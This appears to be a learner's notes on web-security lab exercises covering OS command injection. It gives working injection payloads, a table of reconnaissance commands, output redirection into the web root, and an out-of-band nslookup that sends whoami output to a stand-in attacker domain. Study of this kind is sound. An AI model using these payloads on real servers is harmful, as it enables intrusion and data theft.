## What is OS command injection?
Known also as shell injection letting an attacker to execute OS commands on the server that running the vuln application.
for example:https://insecure-website.com/stockStatus?productID=381&storeID=29
am application pasiing info througth URL then quering legacy systems to get the info then as the systems is old it calls a shell command with the ids as arguments abc.pl 381 29 in this case
if a user will add an & echo abc & like  abc.pl & echo aiwefwlguh & 29 because its a simple shell it will execute it. and the output :
Error - productID was not provided 
aiwefwlguh 
29: command not found
-  the & after the command is to seperate the injected command from the rest to make sure what next wouldnt prevent the injection.
### Lab 01 [OS command injection, simple case]
so after playing with the function i learned few things:
1 the http parser works with regular chars not url encoded ones when using url encoded & the http parser ignores it and the shell using it.
2 the parameters going one after another and when using the shell operand & we backgrounding the function but we still have to consider the second argument as it became an argument to our whoami we putted in the first parameter.
3 eval command recives input as code and lets the user run it.
my solution: productId=1+%26&storeId=whoami
way to get the function code: productId=%26+cat /home/peter-UtMtIS/stockreport.sh+%23&storeId=1
the function:
#!/bin/bash 
set-eu 
eval cksum <<< "$1 $2" | cut -c 2-3 | rev | sed s/0/1/

### useful commands in linux and windows to use when OS Injection Vulnerability Detected
| Commands              | linux         | windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |
###  Blind OS command injection vulnerabilities
Blind - vulnerability which dont response the output to the user with HTTP Response
for example a feedback mail for administrator is never going to response your email with a http response with the output
A way to move around it is to detect the vuln with time delay like & ping -c 10 127.0.0.1 &

## Lab 02 [Blind OS command injection with time delay]
L@gmail.com
the email the only parameter which is vulnerable,the attack accure when the url encoded payload %26+ping+-c+20+127.0.0.1+%26 added to the email parameter.

### blind OS command injection by redirecting output
You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser.
for example: & whoami > /var/www/static/whoami.txt &

### Lab 03 Blind OS command injection with output redirection

csrf=afXShuPMPvCjp6aN09CScRQXJbBwukH7&name=abc&email=abc%40gmail.com+%26+whoami+>+/var/www/images/output.txt+%26&subject=sdsdsds&message=sdsdsdsdsds
same idea as before but with redirection as they teached us  before after making the payload i tried to pull the file from the folder with https://0a9a001f044848ff890281ae00a40030.web-security-academy.net/image i got missing parameter so i put  https://0a9a001f044848ff890281ae00a40030.web-security-academy.net/image?filename=output.txt and gatcha peter-3bLobN

### OS command injection using out-of-band (OAST) techniques

using os command injection to make a outbound network connection guess who is the destination?
for example `& nslookup kgji2ohoyw.web-attacker.com &` 
### Lab 04 out of band os command injection
same here just putting in the email vulnerable part a payload like this `& nslookup kgji2ohoyw.web-attacker.com &` and encoding it then it solved 


``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` will cause the shell to quest the dns server with asking about web named the whoami result.
- lab 05 only for professional users :(
